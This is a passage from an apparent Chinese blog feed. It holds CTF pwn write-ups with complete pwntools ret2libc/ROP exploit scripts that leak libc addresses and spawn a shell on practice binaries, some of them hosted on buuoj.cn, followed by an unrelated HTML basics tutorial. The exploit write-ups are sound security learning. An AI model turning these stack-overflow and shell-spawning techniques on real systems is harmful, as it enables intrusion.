__libc_start_add,    0,    printf_add,    start_add]io.recvuntil('e? ')<span class="hljs-comment"># io.recvuntil('again, ')</span><span class="hljs-comment"># raw_input('-&gt;')</span>p = 'a' * offset + ''.join(map(p64,rop1))io.sendline(p)io.recvline_contains('again')s = io.recvline_contains('again')libc_base = int(u64(s[32:38].ljust(8,'\x00'))) - libc_start_sysRCE = libc_base + 0x4526a<span class="hljs-section">print('libc_base:'+hex(libc_base))</span>io.recvuntil('name? ')<span class="hljs-comment"># io.recvuntil('name? ')</span>p = '\x00' * offset + p64(RCE) + '\x00' * 70sleep(1)raw_input('-&gt;')io.sendline(p)io.interactive()</code></pre></div><h1 id="无libc"><a href="#无libc" class="headerlink" title="无libc"></a>无libc</h1><p>这一部分目前主要是利用LibcSearcher来做的，有时候题目不给libc，用这个也可以解决部分题目。~~用这个以后就不能很方便的用onegadget去一键拿shell了，感觉还是有办法的，想办法拿到LibcSearcher获取到的libc版本就好了，找个时间去实践一下，先慢慢构建rop链就好，正好练习一下这种方法拿shell。~~<br>已经测试出办法咯。<br><code>https://github.com/lieanu/LibcSearcher</code></p><h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><h3 id="查保护和arch-3"><a href="#查保护和arch-3" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15808195388315.jpg" srcset="/img/loading.gif" alt="-w408"></p><h3 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/03/ROP练习/images/15808195745508.jpg" srcset="/img/loading.gif" alt="-w436"><br>函数十分简单，明显栈溢出，思路就是先栈溢出构造rop链，让puts函数打印出<code>__libc_start_main</code>函数的地址，然后再用libcsearcher来获取一下它的libc版本，然后再计算出它的基址，再让函数返回到最初清理一下栈，然后再次进行溢出构造关于<code>system(&#39;/bin/sh&#39;)</code>的rop链即可。</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs undefined">from pwn import *from LibcSearcher import *import time<span class="hljs-comment"># context.log_level = 'debug'</span>io = remote('node3.buuoj.cn',28661)<span class="hljs-comment"># io = process('./bjdctf_2020_babyrop')</span>elf = ELF('./bjdctf_2020_babyrop')<span class="hljs-comment"># blibc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')</span>io.recvuntil('story!\n')padding = 40libc_main_add = elf.got['__libc_start_main']puts_add = elf.symbols['puts']pop_rdi_ret = 0x0400733 p = 'a'*padding + p64(pop_rdi_ret) + p64(libc_main_add) + p64(puts_add) + p64(0x400530)io.sendline(p)s = u64(io.recv(6).ljust(8,'\x00'))print(hex(s))obj = LibcSearcher(<span class="hljs-string">"__libc_start_main"</span>,s)libc_base = s - obj.dump(<span class="hljs-string">"__libc_start_main"</span>)system_add = libc_base + obj.dump(<span class="hljs-string">"system"</span>)binsh_add = libc_base + obj.dump(<span class="hljs-string">"str_bin_sh"</span>)sleep(1)io.recvuntil('story!\n')p = 'a'*padding + p64(pop_rdi_ret) + p64(binsh_add) + p64(system_add)io.sendline(p)io.interactive()</code></pre></div><h2 id="unctf-easyrop"><a href="#unctf-easyrop" class="headerlink" title="unctf_easyrop"></a>unctf_easyrop</h2><h3 id="查保护和arch-4"><a href="#查保护和arch-4" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15808809043718.jpg" srcset="/img/loading.gif" alt="-w432"></p><h3 id="ida分析-4"><a href="#ida分析-4" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/03/ROP练习/images/15808809641958.jpg" srcset="/img/loading.gif" alt="-w397"><br>主程序主要就是限制了v2需要等于<code>ffff</code>才能进入带有溢出的函数，v2的值是<br><img src="/2020/02/03/ROP练习/images/15808810282809.jpg" srcset="/img/loading.gif" alt="-w381"><br>这个在read的时候把控好，让ffff填入这个位置即可。<br><img src="/2020/02/03/ROP练习/images/15808811265759.jpg" srcset="/img/loading.gif" alt="-w407"><br>然后进入这个带有溢出漏洞的函数，可以看到buf的首地址是<code>ebp-0x10</code>，<img src="/2020/02/03/ROP练习/images/15808812877029.jpg" srcset="/img/loading.gif" alt="-w478"><br>然后分析下这里的汇编，它把read函数的溢出位置返回值<code>ebp-0x14</code>取出来，与<code>0x8050000</code>进行比较。<br><img src="/2020/02/03/ROP练习/images/15808814707476.jpg" srcset="/img/loading.gif" alt="-w385"><br>也可以看出，这里是防止我们进行ret2libc的。那我们构造这里可以用一个ret来进行绕过。</p><h4 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h4><p>先控制好v2让其等于<code>ffff</code>，然后进入带有溢出的函数，然后构造rop链，先把<code>__libc_start_main</code>的内存地址泄露出来，然后用libcseacher来确定libc版本，<br>然后dump出<code>__libc_start_main的sympols</code>,算出基址后，接着返回到开始处清理一下栈，再次溢出跟原来一样。然后再次构造rop链的时候，注意ret绕过对咱们溢出地址的检测，在调用system(‘/bin/sh’)即可。</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs undefined">from pwn import *from LibcSearcher import *import time<span class="hljs-comment"># context.log_level = 'debug'</span>io = process('./easyrop')<span class="hljs-comment"># io = remote('183.129.189.60',10011)</span>io.recvuntil('TFer!\n')e =ELF('./easyrop')raw_input('-&gt;')padding = 36start_add = 0x08048400libc_start_main = e.got['__libc_start_main']puts_add = e.symbols['puts']ret = 0x0804839ep = 'f' * paddingrop1 = [    puts_add,    start_add,    libc_start_main]io.sendline(p)io.recvuntil('name?\n')p = '\x00' * 0x18 + ''.join(map(p32,rop1))raw_input('&gt;')io.sendline(p)libc_start_add = u32(io.recv(4))obj = LibcSearcher(<span class="hljs-string">"__libc_start_main"</span>,libc_start_add)libc_base = libc_start_add - obj.dump(<span class="hljs-string">"__libc_start_main"</span>)print(libc_base)system_add = obj.dump('system') + libc_basebinsh_add = obj.dump('str_bin_sh') + libc_baseio.recvuntil('TFer!\n')p = 'f' * paddingio.sendline(p)io.recvuntil('name?\n')rop2 = [    ret,    system_add,    start_add,    binsh_add]p = '\x00' * 0x14 + ''.join(map(p32,rop2))sleep(1)io.sendline(p)io.interactive()</code></pre></div><h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><h3 id="查保护和arch-5"><a href="#查保护和arch-5" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15813386440906.jpg" srcset="/img/loading.gif" alt="-w512"><br>32位</p><h3 id="ida分析-5"><a href="#ida分析-5" class="headerlink" title="ida分析"></a>ida分析</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">int</span> <span class="hljs-function">__cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span>&#123;  be_nice_to_people();  vulnerable_function();  <span class="hljs-function"><span class="hljs-keyword">return</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-number">1</span>, <span class="hljs-string">"Hello, World\n"</span>, <span class="hljs-number">0xD</span>u)</span></span>;&#125;</code></pre></div><p>主函数很简单，漏洞函数是在第二个函数。<br><img src="/2020/02/03/ROP练习/images/15813387437739.jpg" srcset="/img/loading.gif" alt="-w344"><br>栈溢出，然后直接构造rop链即可。<br><img src="/2020/02/03/ROP练习/images/15813388677907.jpg" srcset="/img/loading.gif" alt="-w322"><br>利用思路：用wirte函数泄露出<code>__libc_start_main</code>在内存地址，然后返回start清理一下栈，用libcseacher确定下libc版本，然后进行构造system(‘/bin/sh’)的rop链即可。</p><p>这个我是发现可以用libcseacher确定libc版本后，用one_gadget工具计算RCE位置，然后实现ret to RCE。libcseacher获取到leak地址后，在执行dump libc前的时候，会告诉你，它确定的libc版本号是多少。<br><img src="/2020/02/03/ROP练习/images/15813393524855.jpg" srcset="/img/loading.gif" alt="-w1217"><br>这个是让你选择的。<br><img src="/2020/02/03/ROP练习/images/15813394033522.jpg" srcset="/img/loading.gif" alt="-w826"></p><p><img src="/2020/02/03/ROP练习/images/15813392212443.jpg" srcset="/img/loading.gif" alt="-w1200"><br>在下载的libcseacher时候，其实它是有个数据库的，这里面存着各种libc版本，方便咱们使用。那这个时候，直接用one_gadget 计算下RCE偏移即可。<br><img src="/2020/02/03/ROP练习/images/15813395195579.jpg" srcset="/img/loading.gif" alt="-w1030"></p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs undefined">from pwn import *from LibcSearcher import *context.log_level = 'debug'context.arch = 'i386'elf = ELF('./2018_rop')<span class="hljs-comment"># io = process('./2018_rop')</span>io = remote('node3.buuoj.cn',29692)padding = 140 write_plt = elf.symbols['write']libc_start_main_got = elf.got['__libc_start_main']start = 0x080483C0 p = padding * '\x00' + flat([write_plt,start,1,libc_start_main_got,0x10])<span class="hljs-comment"># raw_input('-&gt;')</span>io.sendline(p)libc_start_main_add = u32(io.recv(4))obj = LibcSearcher('__libc_start_main',libc_start_main_add)libc_base = libc_start_main_add - obj.dump('__libc_start_main')system_add = libc_base + obj.dump('system')binsh_add = libc_base + obj.dump('str_bin_sh')<span class="hljs-comment"># print(libc.symbols['__libc_start_main'])</span>print(hex(libc_base))<span class="hljs-comment"># io.recvline()</span>RCE = libc_base + 0x3cbecp = padding * '\x00' + p32(RCE) + padding * '\x00'<span class="hljs-comment"># p = padding * '\x00' + p32(system_add) + p32(start) + p32(binsh_add)</span>io.sendline(p)io.interactive()</code></pre></div><p>这里面两种办法都行。</p><h2 id="xdctf2015-pwn200"><a href="#xdctf2015-pwn200" class="headerlink" title="xdctf2015_pwn200"></a>xdctf2015_pwn200</h2><h3 id="查保护和arch-6"><a href="#查保护和arch-6" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><span class="hljs-attr">   RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">   Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr">   NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">   PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span></code></pre></div><h3 id="ida分析-6"><a href="#ida分析-6" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/03/ROP练习/images/15814340991655.jpg" srcset="/img/loading.gif" alt="-w601"><br>主函数十分简单，漏洞在vuln函数：<br><img src="/2020/02/03/ROP练习/images/15814341281175.jpg" srcset="/img/loading.gif" alt="-w389"><br>padding为 6c+4 个字节。跟上题很像的攻击思路，直接给exp了。</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<span class="hljs-comment"># io = process('./bof')</span>io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27178</span>)elf = ELF(<span class="hljs-string">'./bof'</span>)libc = elf.libccontext.arch = <span class="hljs-string">'i386'</span>context.log_level = <span class="hljs-string">'debug'</span>padding = <span class="hljs-number">112</span>start_add = <span class="hljs-number">0x080483E0</span>libc_start_main_got = elf.got[<span class="hljs-string">'__libc_start_main'</span>]write_plt = elf.symbols[<span class="hljs-string">'write'</span>]io.recvuntil(<span class="hljs-string">'2015~!\n'</span>)p = padding * <span class="hljs-string">'\x00'</span> + flat([write_plt,start_add,<span class="hljs-number">1</span>,libc_start_main_got,<span class="hljs-number">0x10</span>])io.sendline(p)libc_start_main_add = u32(io.recv(<span class="hljs-number">4</span>))obj = LibcSearcher(<span class="hljs-string">'__libc_start_main'</span>,libc_start_main_add)libc_base = libc_start_main_add - obj.dump(<span class="hljs-string">'__libc_start_main'</span>)print(hex(libc_start_main_add))print(hex(libc_base))io.recvuntil(<span class="hljs-string">'2015~!\n'</span>)rce = libc_base + <span class="hljs-number">0x3a80c</span>p = padding * <span class="hljs-string">'\x00'</span> + p32(rce) + padding * <span class="hljs-string">'\x00'</span>io.sendline(p)io.interactive()</code></pre></div><p>还是本地来base库查libc的one_gadget，然后ret to rce。</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>ROP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTML 基础</title>
    <link href="/2019/12/29/HTML%20%E5%9F%BA%E7%A1%80/"/>
    <url>/2019/12/29/HTML%20%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h2 id="HTML-基础"><a href="#HTML-基础" class="headerlink" title="HTML 基础"></a>HTML 基础</h2><ol><li><strong>HTML标题</strong>：是通过 <code>&lt;h1&gt; - &lt;h6&gt;</code> 标签来定义的.；其会因为数字变化而显示的字体大小变化；</li><li><strong>HTML段落</strong>：通过标签<code>&lt;p&gt;</code> 来定义的.</li><li><strong>HTML链接</strong>：通过标签<code>&lt;a&gt;</code>来定义的。</li><li><strong>HTML图像</strong>：通过标签 <code>&lt;img&gt;</code> 来定义的。</li></ol><h2 id="HTML-文本"><a href="#HTML-文本" class="headerlink" title="HTML 文本"></a>HTML 文本</h2><h4 id="HTML-标题"><a href="#HTML-标题" class="headerlink" title="HTML 标题"></a>HTML 标题</h4><p>标题（Heading）是通过<code>&lt;h1&gt; - &lt;h6&gt;</code> 标签进行定义的.<code>&lt;h1&gt;</code> 定义最大的标题。 <code>&lt;h6&gt;</code>定义最小的标题。<strong>浏览器会自动地在标题的前后添加空行。</strong></p><ul><li><p>标题很重要：</p><p>不要仅仅是为了生成<strong>粗体</strong>或<strong>大号</strong>的文本而使用标题，而是==为了用户可以通过标题来快速浏览您的网页应该将 h1 用作主标题==（最重要的），其后是 h2（次重要的），再其次是 h3，以此类推。</p></li></ul><h4 id="HTML-注释"><a href="#HTML-注释" class="headerlink" title="HTML 注释"></a>HTML 注释</h4><p><strong>注释</strong>： 开始括号之后（左边的括号）需要紧跟一个叹号，结束括号之前（右边的括号）不需要，合理地使用注释可以对未来的代码编辑工作产生帮助。。</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 这是一个注释 --&gt;</span></code></pre></div><h4 id="HTML-段落"><a href="#HTML-段落" class="headerlink" title="HTML 段落"></a>HTML 段落</h4><p>浏览器会自动地在段落的前后添加空行。<strong>（<code>&lt;/p&gt;</code>是块级元素）</strong></p><h4 id="HTML-水平线"><a href="#HTML-水平线" class="headerlink" title="HTML 水平线"></a>HTML 水平线</h4><p>1：<code>&lt;hr&gt;</code>标签在 HTML 页面中创建水平线。</p><h4 id="HTML-文本格式化"><a href="#HTML-文本格式化" class="headerlink" title="HTML 文本格式化"></a>HTML 文本格式化</h4><p>通常用到<code>&lt;strong&gt;&lt;em&gt;&lt;del&gt;</code>这几个标签。</p><h4 id="练习："><a href="#练习：" class="headerlink" title="练习："></a>练习：</h4><div class="hljs"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>文本<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-comment">&lt;!-- &lt;h1&gt;标题1&lt;/h1&gt;&lt;h2&gt;标题2&lt;/h2&gt;&lt;h3&gt;标题3&lt;/h3&gt;&lt;h4&gt;标题4&lt;/h4&gt;&lt;h5&gt;标题5&lt;/h5&gt;&lt;h6&gt;标题6&lt;/h6&gt; --&gt;</span><span class="hljs-comment">&lt;!-- &lt;h&gt;标签有大小之分 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>五花山<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我家住在大山里。你知道这里的山是什么颜色的吗？<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>春天的山是绿色的，那绿色淡淡的，许多树叶刚冒出芽来，还带着嫩嫩的黄色呢。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>夏天的山也是绿色的，那绿色浓浓的，一片片树叶，不管是大的还是小的，都像被绿油彩涂过，连雨点落上去，都给染绿了。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>秋天的山不再是一种颜色了。下过一场秋霜有的树林变成了金黄色□好像所有的阳光都集中到那儿去了有的树林变成了杏黄色远远望去，就像枝头挂满了熟透的杏和梨；有的树林变成了火红色，风一吹，树林跳起舞来，就像一簇簇火苗在跳跃；还有的树林变得紫红紫红，跟剧场里的紫绒幕布的颜色一样。只有松柏不怕秋霜，针一样的叶子还是那么翠绿。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>秋天的山一片金黄，一片火红，一片翠绿……人们给这五颜六色的山起了个好听的名字，叫“<span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">del</span>&gt;</span>五花山<span class="hljs-tag">&lt;/<span class="hljs-name">del</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span>”。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 几个标签的嵌套 --&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>加粗<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>斜体<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">del</span>&gt;</span>删除文字<span class="hljs-tag">&lt;/<span class="hljs-name">del</span>&gt;</span><span class="hljs-comment">&lt;!-- &lt;span&gt;配合css&lt;/span&gt; --&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><p>效果：</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/wenben.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTML-图像"><a href="#HTML-图像" class="headerlink" title="HTML 图像"></a>HTML 图像</h2><p> ==<strong>HTML 图像-</strong>== ：</p><ol><li>标签（ <code>&lt;img&gt;</code>）是空标签，意思是说，它只包含属性，并且没有闭合标签。</li><li>源属性（<code>&lt;src&gt;</code>）是图像的 URL 地址。分为本地和网上，本地图片写路径的时候注意<strong>绝对路径和相对路径</strong>（可以用<code>../</code>来返回 一级目录，返回几级目录就写几个它就行)。</li><li>Alt属性:alt 属性用来为图像定义一串预备的可替换的文本,在浏览器无法载入图像时,告用户图片的信息。<strong>==搜索引擎也是通过此描述来收集图片的==</strong>.</li><li>高度与宽度:height（高度） 与 width（宽度）属性用于设置图像的高度与宽度。属性值默认单位为像素px。</li></ol><p>练习：</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>图片<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"1.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"chumen的qq图像"</span> <span class="hljs-attr">title</span>=<span class="hljs-string">"chumen的qq图像"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><h4 id="图片的映射"><a href="#图片的映射" class="headerlink" title="图片的映射"></a>图片的映射</h4><p>目标是为了在一张图片上的<strong>某个位置</strong>点击后<strong>才</strong>可以实现某个功能。</p><p>这需要用到<code>usemap=&quot;#diyname&quot;</code> 然后用<code>&lt;map name=&quot;diyname&quot;&gt;&lt;/map&gt;</code>标签来对应。</p><p>核心代码：`<map name="1map"></map></p><div class="hljs"><pre><code class="hljs undefined">&lt;area <span class="hljs-attribute">shape</span>=<span class="hljs-string">""</span> <span class="hljs-attribute">coords</span>=<span class="hljs-string">""</span> <span class="hljs-attribute">href</span>=<span class="hljs-string">""</span>&gt;</code></pre></div><p>\\`</p><p>shape是选择的形状，coords是坐标，坐标确定<strong>推荐用qq的截图功能那里来确定</strong>，比如：</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/quzuobiao.jpg?raw=true" srcset="/img/loading.gif" alt></p><p>那这个彩色箭头指的位置就是在这个图像的（233,456）位置。</p><p><strong>练习：</strong></p><div class="hljs"><pre><code class="hljs HTML"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>图片的映射<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"1.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span> <span class="hljs-attr">usemap</span>=<span class="hljs-string">"#1map"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">map</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"1map"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">area</span> <span class="hljs-attr">shape</span>=<span class="hljs-string">"circle"</span> <span class="hljs-attr">coords</span>=<span class="hljs-string">"300,255,50"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"_blank"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"http://www.baidu.com"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><p><strong>效果</strong>：<img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/yingshe.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTML-超链接"><a href="#HTML-超链接" class="headerlink" title="HTML 超链接"></a>HTML 超链接</h2><p>超链接可以是一个字，一个词，或者一组词，也可以是一幅图像，您可以点击这些内容来跳转到新的文档或者当前文档中的某个部分。使用标签 <code>&lt;a&gt;</code>来设置超文本链接。</p><ul><li><p><strong>HTML 链接语法</strong>:<code>&lt;a href=&quot;url&quot;&gt;链接文本&lt;/a&gt;</code>  ,href 属性描述了链接的目标。</p></li><li><p><strong>target 属性</strong>  :<code>target=&quot;_blank&quot;</code>效果就是在新窗口（空白界面）做出来 。</p></li><li><p><strong>id 属性</strong>:id属性可用于创建在一个HTML文档书签标记,在HTML文档中插入ID:</p><p><code>&lt;a id=&quot;tips&quot;&gt;有用的提示部分&lt;/a&gt;</code> </p><p>在HTML文档中创建一个链接到”有用的提示部分(id=”tips”）”:</p><p><code>&lt;a href=&quot;#tips&quot;&gt;访问有用的提示部分&lt;/a&gt;</code></p></li></ul><p><strong>解释加补充</strong>：ID 属性名字只能有一个不可重复，且必须以==字母==开头，可以在一个界面的任何位置的内容进行设置ID，在设置完后，（<code>&lt;a href=&quot;# &quot;&gt;</code>），在==“#”==后加入id的名称即可跳转到你设置ID的内容处。</p><p><code>&lt;a name=&quot;end&quot;&gt;&lt;/a&gt;</code> <code>&lt;a href=&quot;#end&quot;&gt;end&lt;/a&gt;</code>    <strong>做锚点时，替换id的方法，作用可以实现一样！id不好用时用这个</strong></p><p><strong>练习：</strong>（为了方便阅读，省略了很多的<code>&lt;br&gt;</code>.）</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>超级链接<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"http://www.mi.com"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"_blank"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"1.png"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>    <span class="hljs-comment">&lt;!-- /*书签标记：锚点*/ --&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#end"</span>&gt;</span>end<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"aa"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"miao"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"miao"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"end"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#miao"</span>&gt;</span>miao<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><h2 id="HTML-列表"><a href="#HTML-列表" class="headerlink" title="HTML 列表"></a>HTML 列表</h2><ul><li><strong>HTML无序列表</strong>：<code>&lt;ul&gt;</code>与 <code>&lt;li&gt;</code>其点的样式(圆圈，圆心，正方形）用<strong>css</strong>来控制<code>&lt;ul style=&quot;list-style-type:circle&quot;&gt;</code></li><li><strong>HTML 有序列表</strong> <code>&lt;ol&gt;</code>与<code>&lt;li&gt;</code>   用法和无序相似，<strong>且有序与无序之间可以互相嵌套</strong>，<strong>嵌套过程中点的形状也会自动变化。</strong></li><li><strong>HTML 